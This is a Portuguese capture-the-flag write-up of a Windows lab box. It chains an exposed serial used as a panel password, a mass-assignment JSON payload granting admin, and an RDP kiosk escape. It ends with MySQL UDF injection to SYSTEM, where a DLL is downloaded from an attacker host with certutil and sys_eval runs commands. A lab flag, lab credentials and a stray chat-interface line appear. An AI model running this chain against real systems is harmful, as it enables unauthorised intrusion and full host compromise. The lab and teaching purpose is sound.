---
title: "Touch"
date: 2026-10-10
type: "labs"
difficulty: "Medium"
pwned: true
os: "Windows"
tags: ["windows", "web", "api-auth-bypass", "mass-assignment", "rdp", "mysql", "udf-injection", "cve-privesc", "nt-authority-system"]
summary: "Windows box com API Nexion DeviceHub. Serial exposto vira senha do painel, mass assignment eleva a sessão, RDP para user, e UDF injection no MySQL (rodando como SYSTEM) para root."
machine_info:
  IP: "10.129.116.16"
  OS: "Windows"
  Dificuldade: "Medium"
  Vetor inicial: "API Nexion DeviceHub (serial -> senha) + mass assignment"
  Privesc: "UDF injection no MySQL rodando como SYSTEM"
  Porta principal: "8443/tcp (HTTP API)"
---
 
## Reconhecimento
 
```bash
$ nmap -sC -sV -p- 10.129.116.16
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
3389/tcp open  ms-wbt-server Microsoft Terminal Service
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
8443/tcp open  http          Microsoft HTTPAPI httpd 2.0
|_http-title: Nexion DeviceHub - Login
|_http-cors: GET POST PUT OPTIONS
```
 
O cabeçalho `http-cors` revela que o endpoint aceita `PUT` — detalhe usado depois na manipulação de configurações. A porta `8443` (Nexion DeviceHub) é o ponto de entrada; `3389` (RDP) será o acesso gráfico inicial.
 
> Contexto: a máquina **Layover** forneceu a pista inicial (nome `Jenny Crawford` / código de reserva `KS7X2M`). A **Touch** é a continuação da cadeia.
 
## Enumeração da API — Nexion DeviceHub (8443)
 
O endpoint de status responde **sem autenticação**:
 
```bash
$ curl -i -k http://10.129.116.16:8443/api/status
{"device":"Nexion DeviceHub DH-100","serial":"NX-DH-2024-B7042","firmware":"1.4.2","status":"online","uptime":82164}
```
 
O número de série `NX-DH-2024-B7042` é reutilizado como **senha padrão** do painel `/login`. Credencial derivada do próprio serial exposto → gera um cookie de sessão válido `nxsession`.
 
```bash
# exemplo de sessão usada abaixo
nxsession=63fd1ddb35544ac7b769020ca9c021b4
```
 
Recuperando a última captura do scanner (confirma JPEG pelo header `FFD8 FFE0 ... JFIF`):
 
```bash
$ curl -i -k -b "nxsession=63fd1ddb35544ac7b769020ca9c021b4" \
    http://10.129.116.16:8443/api/scan/last-capture -o lastcap.bin
$ xxd lastcap.bin | head
00000110: ffd8 ffe0 0010 4a46 4946 0001 0101 0060  ......JFIF.....`
```
 
## Exploração — Mass Assignment (object injection)
 
O endpoint de settings aceita escrita via `PUT`. Teste legítimo primeiro:
 
```bash
$ curl -s -b "nxsession=63fd1ddb35544ac7b769020ca9c021b4" \
    -X PUT http://10.129.116.16:8443/api/scanner/settings \
    -H "Content-Type: application/json" \
    -d '{"resolution":"XSSPROBE123","format":"JPEG","mrzDetection":true,"autoCalibrate":true}'
{"success":true}
```
 
Abusando do merge de campos arbitrários para forçar atributos de privilégio na sessão:
 
```bash
$ curl -i -b "nxsession=63fd1ddb35544ac7b769020ca9c021b4" \
    -X PUT http://10.129.116.16:8443/api/scanner/settings \
    -H "Content-Type: application/json" \
    -d '{"proto":{"admin":true,"isAdmin":true,"role":"admin"}}'
{"success":true}
```
 
A API mescla o corpo JSON no objeto de sessão/configuração sem validação → a sessão é elevada a **admin**.
 
## Acesso Inicial — RDP (User Flag)
 
```bash
$ xfreerdp /v:10.129.116.16 /u:KioskUser /p:'K!0sk2026#' /cert:ignore /dynamic-resolution
```
 
Saindo do modo kiosk:
 
1. Abra a interface local do scanner em `http://10.129.116.16:8443/scanner/` e desative o scanner.
2. Use a função de "abrir localmente" / navegação para chamar o prompt: `C:\Windows\System32\cmd.exe`
3. Leia a flag:
```cmd
C:\> type C:\Users\KioskUser\Desktop\user.txt
```
 
## Escalação de Privilégio — UDF Injection (MySQL como SYSTEM)
 
Credenciais do MySQL estão em texto claro no código e na config:
 
```ts
// C:\Program Files\HTB Airways\Kiosk\packages\backend\src\database\index.ts
const defaults = {
  host: "127.0.0.1", port: 3306,
  user: "kiosk_app", password: "K!0sk_R3pl1ca#DB",
  database: "htb_airways"
};
```
 
```cmd
C:\> type "C:\ProgramData\HTB Airways\refresh-dates.bat"
@echo off
C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026 < "C:\ProgramData\HTB Airways\refresh-dates.sql" 2>nul
```
 
| Usuário    | Senha               |
|------------|---------------------|
| kiosk_app  | `K!0sk_R3pl1ca#DB`  |
| root       | `HTB@irw4ys_DB!2026`|
 
O MySQL escuta só em `127.0.0.1` (acessível pela sessão RDP) e roda como **SYSTEM** → vetor de UDF injection. Localizando o diretório de plugins:
 
```cmd
C:\> C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -e "SHOW VARIABLES LIKE 'plugin_dir';"
plugin_dir    C:\MySQL\lib\plugin\
```
 
Servindo a DLL a partir do Kali e baixando na vítima:
 
```bash
# máquina de ataque
$ cd /tmp && python3 -m http.server 9090
```
 
```cmd
C:\> certutil -urlcache -split -f http://10.10.14.254:9090/lib_mysqludf_sys_64.dll C:\MySQL\lib\plugin\lib_mysqludf_sys_64.dll
```
 
Registrando a função e validando execução como SYSTEM:
 
```cmd
C:\> C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -e "CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys_64.dll';"
C:\> C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -e "SELECT sys_eval('whoami');"
sys_eval('whoami')
nt authority\system
```
 
> ⚠️ Use sempre aspas retas (`"`), não tipográficas (`”`), ou ocorre *Access denied*. Para caminhos, escape as barras (`\\`), senão o parsing retorna `NULL`.
 
Lendo a root flag:
 
```cmd
C:\> C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -e "SELECT sys_eval('type C:\\Users\\Administrator\\Desktop\\root.txt');"
62ddf64bbc3bda1b6fc6d3620b5b653f
```
 
## Flags
 
```
user.txt → Desktop do KioskUser (escape do kiosk via RDP)
root.txt → 62ddf64bbc3bda1b6fc6d3620b5b653f
```
 
## Lições / Vulnerabilidades
 
- **Credencial derivada de identificador público** — serial exposto em `/api/status` servia como senha do painel.
- **Mass assignment** — campos arbitrários do JSON mesclados na sessão permitiam `role: admin`.
- **Segredos em texto claro** — senhas do MySQL (incl. root) embutidas em código-fonte e `.bat`.
- **MySQL como SYSTEM + `plugin_dir` gravável** — permitiu UDF injection e RCE com privilégio máximo.
**Mitigações:** não derivar senhas de IDs públicos; forçar troca de defaults; validar/whitelist de campos na API; remover segredos do código (usar cofre); rodar o MySQL com conta de baixo privilégio e restringir escrita em `plugin_dir`.
 
Claude terminou a resposta
